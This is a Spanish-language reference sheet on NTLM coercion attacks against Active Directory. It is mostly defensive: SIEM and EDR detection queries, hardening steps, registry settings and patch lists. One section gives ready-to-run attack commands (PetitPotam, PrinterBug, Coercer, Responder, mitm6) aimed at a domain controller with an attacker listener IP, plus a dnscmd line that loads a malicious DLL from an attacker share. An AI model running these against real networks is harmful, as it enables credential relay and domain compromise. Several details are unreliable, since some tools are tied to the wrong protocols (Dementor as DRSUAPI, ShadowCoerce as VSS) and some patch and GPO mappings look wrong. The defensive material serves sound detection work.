# 🛑 Ataques de **Coerción NTLM en Active Directory** (Familia Coerce: PrinterBug, PetitPotam, Dementor, ShadowCoerce, DFSCoerce, Coercer, ADIDNS/DNSadmin, Responder, WPAD/LLMNR/mDNS, y más)

---

## 📝 ¿Qué son los ataques de Coerción NTLM?

| Concepto      | Descripción                                                                                                            |
|---------------|-----------------------------------------------------------------------------------------------------------------------|
| **Definición**| Familia de técnicas que abusan de protocolos y servicios Windows para forzar a un servidor (ej. DC) a autenticarse NTLM contra un host controlado por el atacante. |
| **Finalidad** | Obtener autenticaciones privilegiadas (NTLM) para relaying, escalada lateral, takeover de recursos o persistencia.      |

---

## 🛠️ ¿Cómo funcionan los ataques de coerción? (TTPs y ejemplos)

| Vector/Nombre              | Protocolo/Servicio             | Descripción breve                                                                                 |
|----------------------------|-------------------------------|--------------------------------------------------------------------------------------------------|
| **PrinterBug**             | MS-RPRN / Print Spooler       | Abusa del spooler para forzar autenticación a un recurso UNC remoto.                             |
| **PetitPotam**             | EFSRPC                        | Coerción a través de MS-EFSRPC, fuerza autenticación NTLM a recurso controlado.                  |
| **Dementor**               | DRSUAPI                       | Aprovecha el API de replicación de AD para forzar autenticación de DCs.                          |
| **ShadowCoerce**           | VSS (Shadow Copy)             | Usa VSS para forzar autenticación de sistemas críticos.                                           |
| **DFSCoerce**              | DFSNM (Distributed File System Namespace)| Coerción usando DFSN para NTLM relay.                                              |
| **Coercer**                | Multiprotocolo (automatiza abuso) | Framework que automatiza coerción sobre múltiples protocolos/pipes conocidos y futuros.      |
| **ADIDNS/DNSadmin**        | DNS / dnscmd                  | Abusa de permisos DNSAdmins para forzar autenticación remota vía registros maliciosos.           |
| **Responder**              | LLMNR/NBT-NS/WPAD/mDNS        | Suplantación de respuestas en protocolos legacy para forzar autenticaciones de clientes.          |
| **WPAD/LLMNR/mDNS/MITM6**  | Proxy/WPAD/DNSv6              | Ataques de MITM y manipulación de descubrimiento de proxies para forzar autenticaciones.          |
| **FSRVPCoerce**            | FSRVP                         | Abusa del File Share Shadow Copy Provider para coerción.                                          |
| **SchtasksCoerce**         | Schtasks                      | Usa programación de tareas remotas para forzar autenticación.                                     |
| **ICPRCoerce**             | ICertPassageRemote            | Coerción vía servicios/funciones de Certificados (CA).                                            |
| **Otros futuros/derivados**| Pipes y servicios emergentes  | Cualquier nuevo servicio Windows que acepte recursos UNC puede ser objetivo de coerción.          |

---

## 💻 Ejemplo práctico (familia completa)

```bash
# PrinterBug (MS-RPRN)
python3 printerbug.py essos.local/user:pass@192.168.57.10 192.168.57.151

# PetitPotam (EFSRPC)
python3 PetitPotam.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# Dementor (DRSUAPI)
python3 dementor.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# ShadowCoerce (VSS)
python3 shadowcoerce.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# DFSCoerce (DFSNM)
python3 dfscoerce.py -u user -p pass -d essos.local 192.168.57.10 192.168.57.151

# Coercer (Multiprotocolo, incluye variantes y futuras)
python3 Coercer.py -u user -p pass -d essos.local -t 192.168.57.10 -l 192.168.57.151

# ADIDNS/DNSadmin
dnscmd <DNS-Server> /config /serverlevelplugindll \\192.168.57.151\share\malicious.dll

# Responder (LLMNR/NBT-NS/WPAD/mDNS)
sudo responder -I eth0

# MITM6 (IPv6, WPAD/mDNS/LLMNR)
python3 mitm6.py --ignore-nofqdn -d essos.local

# FSRVPCoerce/SchtasksCoerce/ICPRCoerce
# (Ejemplo genérico, usando Coercer para automatizar)
python3 Coercer.py --method FSRVP --target 192.168.57.10 --listener 192.168.57.151
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 5145**            | Acceso a recursos compartidos/Pipes nombrados (SMB).                         |
| **ObjectName**                  | Pipe vulnerable: `\efsrpc`, `\spoolss`, `\netdfs`, `\vss`, `\lsarpc`...      |
| **4624/4625/8004**              | Autenticaciones NTLM entrantes/salientes tras el acceso al pipe.             |
| **Client_Address / IpAddress**  | Origen de la petición/relayed authentication.                                |
| **ProcessName**                 | Proceso iniciador (útil con Sysmon).                                         |

### Query Splunk básica (acceso a pipes sospechosos)

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=5145
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| table _time, ComputerName, SubjectAccountName, Object_Name, IpAddress
```

### Detección de autenticaciones NTLM sospechosas tras coerción

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4624 OR EventCode=4625)
| search AuthenticationPackageName="NTLM"
| table _time, ComputerName, Account_Name, IpAddress, LogonType
```

### Buscar secuencias de acceso a pipe + autenticación NTLM

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=5145 OR EventCode=4624)
| transaction IpAddress maxspan=5s
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| where AuthenticationPackageName="NTLM"
| table _time, ComputerName, IpAddress, Object_Name, Account_Name
```

### Detección de ataques a DNSAdmin/ADIDNS

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=5136 OR EventCode=4670)
| search Object_Name="serverlevelplugindll"
| table _time, SubjectAccountName, Object_Name, ComputerName
```

### Detección de Responder/MITM6 (Solicitudes LLMNR/NBT-NS/WPAD/mDNS)

> Importante: Para cazar Responder/LLMNR/MITM6, además de logs de Windows, monitoriza tráfico de red:
- Alertas de múltiples NetBIOS/LLMNR/mDNS queries.
- Solicitudes WPAD anómalas en logs de proxy/firewall.
- Cambios en registros DNS y DHCP.

---

## 🔎 Queries avanzadas de hunting

### 1. Hosts que acceden a varios pipes de coerción en poco tiempo

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=5145
| search Object_Name="\\pipe\\efsrpc" OR Object_Name="\\pipe\\spoolss" OR Object_Name="\\pipe\\netdfs" OR Object_Name="\\pipe\\vss" OR Object_Name="\\pipe\\lsarpc"
| stats count by IpAddress, Object_Name
| where count > 2
```

### 2. Correlación con herramientas sospechosas (Sysmon: proceso Python/Impacket)

```splunk
index=sysmon_logs EventCode=1
| search (Image="*python.exe" OR Image="*impacket*" OR Image="*Coercer*" OR Image="*mitm6*" OR Image="*responder*")
| table _time, Computer, User, Image, CommandLine
```

### 3. Detección de DC autenticándose fuera de la red (“machine account authentication”)

```splunk
index=dc_logs sourcetype=WinEventLog:Security EventCode=4624
| search Account_Name="*$" AND (NOT (IpAddress="10.*" OR IpAddress="192.168.*" OR IpAddress="172.16.*"))
| table _time, Account_Name, IpAddress, ComputerName
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Coercion Attacks - Detección de conexiones forzadas NTLM
DeviceNetworkEvents
| where RemotePort in (445, 135, 139)
| where ActionType == "ConnectionSuccess"
| summarize ConnectionCount = count(), UniqueRemoteIPs = dcount(RemoteIP) by DeviceId, LocalPort, bin(Timestamp, 5m)
| where ConnectionCount > 10 or UniqueRemoteIPs > 5
| order by ConnectionCount desc
```

```kql
// Detección de herramientas de coerción conocidas
DeviceProcessEvents
| where ProcessCommandLine has_any ("coercer", "petitpotam", "printerbug", "spoolsample", "dfscoerce")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de ataques contra servicios vulnerables
DeviceNetworkEvents
| where RemotePort in (445, 135) and ActionType == "ConnectionSuccess"
| join kind=inner (
    DeviceEvents
    | where ActionType has_any ("RpcCall", "NamedPipeAccess")
    | where AdditionalFields has_any ("spoolss", "efsrpc", "dfsnm", "fsrvp")
) on DeviceId
| project Timestamp, DeviceName, RemoteIP, RemotePort, AdditionalFields
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **NTLM Coercion Spike** | Múltiples conexiones forzadas en poco tiempo | Alta |
| **Coercion Tools** | Detección de herramientas de coerción conocidas | Alta |
| **Vulnerable Service Access** | Acceso a servicios vulnerables a coerción | Media |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de ataques de coerción basado en conexiones RPC/SMB
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort IN (445, 135, 139)
| bin _time span=5m
| stats dc(RemoteAddressIP4) as unique_targets, count as total_connections by ComputerName, UserName, _time
| where unique_targets > 5 OR total_connections > 20
| sort - unique_targets
```

```sql
-- Detección de herramientas de coerción
event_platform=Win event_simpleName=ProcessRollup2 
| search (FileName=*coercer* OR CommandLine=*petitpotam* OR CommandLine=*printerbug* OR CommandLine=*spoolsample*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de acceso a named pipes vulnerables
event_platform=Win event_simpleName=NamedPipeEvent
| search PipeName IN (*spoolss*, *efsrpc*, *lsarpc*, *netlogon*)
| table _time, ComputerName, PipeName, ProcessName, UserName
| sort - _time
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar patrones de coerción NTLM
event_platform=Win event_simpleName=AuthActivityAuditLog
| search LogonType=3 AuthenticationPackageName=NTLM
| bin _time span=1m
| stats dc(TargetUserName) as unique_accounts by ComputerName, UserName, _time
| where unique_accounts > 3
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de Coercion Attacks

```kql
// Query principal para detectar ataques de coerción
SecurityEvent
| where EventID == 4624
| where LogonType == 3 and AuthenticationPackageName == "NTLM"
| where Account endswith "$"
| summarize LogonCount = count(), UniqueComputers = dcount(Computer) by Account, IpAddress, bin(TimeGenerated, 5m)
| where LogonCount > 5 or UniqueComputers > 2
| order by LogonCount desc
```

```kql
// Correlación con herramientas de coerción
DeviceProcessEvents
| where ProcessCommandLine has_any ("petitpotam", "coercer", "printerbug", "spoolsample")
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 and Account endswith "$"
    | project TimeGenerated, Computer, Account, IpAddress
) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, ProcessCommandLine, Account, IpAddress
```

### Hunting avanzado

```kql
// Detección de acceso a servicios vulnerables
SecurityEvent
| where EventID == 5145 // Object access
| where ShareName in ("IPC$", "ADMIN$") and RelativeTargetName has_any ("spoolss", "efsrpc", "lsarpc")
| summarize AccessCount = count() by Account, IpAddress, RelativeTargetName, bin(TimeGenerated, 5m)
| where AccessCount > 3
| order by AccessCount desc
```

```kql
// Detección de relay posterior a coerción
SecurityEvent
| where EventID == 4624 and LogonType == 3 and Account endswith "$"
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 and not(Account endswith "$")
    | project TimeGenerated, Computer, Account, IpAddress
) on IpAddress
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 10m
| project TimeGenerated1, Computer1, Account1, IpAddress, TimeGenerated, Computer, Account
```

---

## 🦾 Hardening y mitigación

| Medida                                       | Descripción                                                                                      |
|-----------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Deshabilitar servicios vulnerables**        | EFS, Print Spooler, VSS, DFSNM, FSRVP, etc. en DCs y servidores que no los requieran.            |
| **Limitación SMB/RPC**                       | Restringe acceso a 445/135 solo a hosts legítimos (firewall, segmentación, IPSec).               |
| **Deshabilitar protocolos legacy**           | LLMNR, NBT-NS, WPAD, mDNS en todo el parque (GPO, directivas de red, hardening).                 |
| **Aplicar parches**                           | Mantén todos los parches críticos aplicados (CVE-2021-36942 y posteriores).                      |
| **SMB Signing y canal seguro**                | Fuerza SMB signing y canal seguro en DCs y servidores críticos.                                  |
| **Auditoría y monitorización**                | Habilita logs detallados de acceso a pipes y autenticaciones NTLM.                               |
| **Zero Trust y segmentación**                 | Microsegmenta y limita rutas de administración remota y tráfico SMB/RPC lateral.                 |
| **Deshabilitar NTLM**                         | Donde sea posible, deshabilita NTLM o limita uso a sistemas legacy bien controlados.             |
| **Inventariado y revisión periódica**         | Scripts periódicos para detectar exposición de servicios/pipes y detectar nuevos vectores.        |
| **Alertas proactivas**                        | Alertas automáticas en SIEM ante cualquier acceso inesperado a pipes, servicios o DNSAdmin.       |
| **Honeypipes y honeypots**                    | Implementa pipes/servicios señuelo para detectar y alertar ante intentos de coerción.            |
| **Monitorización de red avanzada**            | Usa IDS/IPS, Netflow y reglas personalizadas para detectar patrones de Responder/MITM6.           |

---

## 🧑‍💻 ¿Cómo revisar servicios vulnerables activos? (PowerShell)

```powershell
Get-Service EFS, Spooler, VSS, DFSN, FSRVP | Where-Object {$_.Status -eq 'Running'}
```

### Listar pipes expuestos actualmente

```powershell
Get-ChildItem -Path \\.\pipe\ | Where-Object { $_.Name -match "efsrpc|spoolss|netdfs|vss|lsarpc" }
```

### Validar reglas de firewall críticas

```powershell
Get-NetFirewallRule | Where-Object { $_.LocalPort -eq 445 -or $_.LocalPort -eq 135 }
```

### Validar estado de protocolos legacy (ej. LLMNR, WPAD)

- **GPO para LLMNR:**
    - Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution = Enabled

- **Deshabilitar WPAD (IE/Edge):**
    - Computer Configuration > Administrative Templates > Windows Components > Internet Explorer > Disable Automatic Proxy Result Cache = Enabled

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Honeypipes y honeyservices:**  
  Deploy pipes/servicios señuelo que alerten instantáneamente en SIEM si se accede a ellos (detección proactiva de Red Team/Threat Actor).

- **Reducción de ataque en legacy:**  
  Proxy SMB/RPC legacy solo para hosts legacy estrictamente controlados, con alertas de uso.

- **Automatización de inventariado y exposición:**  
  Scripts periódicos que reportan exposición de servicios/pipes críticos y alertan ante nuevos vectores.

- **Threat Intelligence Automation & ML:**  
  Correlaciona IOC de herramientas ofensivas, comportamiento anómalo en pipes, y bloquea automáticamente en firewall, NAC o EDR.

- **Uso de YARA para pipes/servicios:**  
  YARA custom en EDR para procesos que abran pipes sospechosos o usen nombres de servicio de coerción.

- **Integración con SOAR:**  
  Playbooks automáticos que deshabilitan servicios, aíslan máquinas o informan a Blue Team tras detección de patrón de coerción.

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5005413** | Windows 11/10/Server - Parche crítico para PetitPotam y ataques de coerción via EFSRPC.    |
| **KB5004946** | Windows Server 2016/2019 - Mitigación de ataques de coerción via PrinterBug y similares.   |
| **KB5005010** | Windows Server 2022 - Mejoras en protección contra coerción via múltiples protocolos RPC.  |
| **KB5022845** | Todas las versiones - Fortalecimiento de validaciones RPC y prevención de coerción.        |
| **KB5025221** | Actualizaciones más recientes - Mejoras en Channel Binding y protección EPA.               |
| **RPC Security Updates** | Actualizaciones del subsistema RPC para mejor autenticación y validación.       |

### Configuraciones de registro críticas

```powershell
# Deshabilitar EFS RPC (PetitPotam mitigation)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EFS" -Name "Start" -Value 4

# Configurar EPA (Extended Protection for Authentication)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "SuppressExtendedProtection" -Value 0

# Habilitar LDAP Channel Binding (crucial contra coerción)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LdapEnforceChannelBinding" -Value 2

# Configurar RPC authentication level
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Rpc\ClientProtocols" -Name "AuthnLevel" -Value 6
```

### Configuraciones de GPO críticas

```powershell
# Deshabilitar servicios RPC vulnerables via GPO
# Computer Configuration\Policies\Windows Settings\Security Settings\System Services:
# "Encrypting File System (EFS)" = Disabled
# "Print Spooler" = Disabled (donde no sea necesario)

# Configurar autenticación RPC
# Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options:
# "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" = Deny all
```

### Scripts de validación post-parche

```powershell
# Verificar que EFS esté deshabilitado
$efsService = Get-Service -Name "EFS" -ErrorAction SilentlyContinue
if ($efsService.StartType -eq "Disabled") {
    Write-Host "✓ EFS Service deshabilitado correctamente" -ForegroundColor Green
} else {
    Write-Host "✗ DESHABILITAR EFS Service para prevenir PetitPotam" -ForegroundColor Red
}

# Verificar LDAP Channel Binding
$ldapBinding = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue
if ($ldapBinding.LdapEnforceChannelBinding -eq 2) {
    Write-Host "✓ LDAP Channel Binding configurado" -ForegroundColor Green
} else {
    Write-Host "✗ CONFIGURAR LDAP Channel Binding" -ForegroundColor Red
}

# Verificar EPA
$epa = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "SuppressExtendedProtection" -ErrorAction SilentlyContinue
if ($epa.SuppressExtendedProtection -eq 0) {
    Write-Host "✓ Extended Protection for Authentication habilitado" -ForegroundColor Green
} else {
    Write-Host "✗ HABILITAR Extended Protection for Authentication" -ForegroundColor Red
}
```

### Actualizaciones críticas de seguridad

- **CVE-2021-36942**: PetitPotam - EFSRPC coerción attack (KB5005413)
- **CVE-2021-1675**: PrintNightmare relacionado con PrinterBug coerción (KB5004945)
- **CVE-2019-1040**: LDAP Channel Binding bypass usado en coerción (KB4511553)
- **CVE-2021-43893**: Vulnerabilidad RPC que facilita ataques de coerción (KB5008212)

### Herramientas de detección específicas

```powershell
# Script para detectar intentos de coerción
$rpcEvents = Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} -MaxEvents 100
$rpcEvents | Where-Object {$_.Message -like "*lsarpc*" -or $_.Message -like "*efsrpc*"} |
ForEach-Object {
    Write-Warning "Posible intento de coerción: $($_.TimeCreated) - $($_.Message.Substring(0,100))"
}

# Monitorear conexiones RPC anómalas
Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 135 -and $_.State -eq "Established"} |
Group-Object RemoteAddress | Where-Object Count -gt 5 |
Select-Object Name, Count | Sort-Object Count -Descending
```

---

## 📚 Referencias

- [PetitPotam - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/petitpotam)
- [Coercer Project](https://github.com/p0dalirius/Coercer)
- [Responder](https://github.com/lgandx/Responder)
- [MITM6](https://github.com/dirkjanm/mitm6)
- [Microsoft Guidance on EFSRPC/SMBCoercion](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)
- [DFSCerce/PrinterBug/Impacket](https://github.com/fortra/impacket)
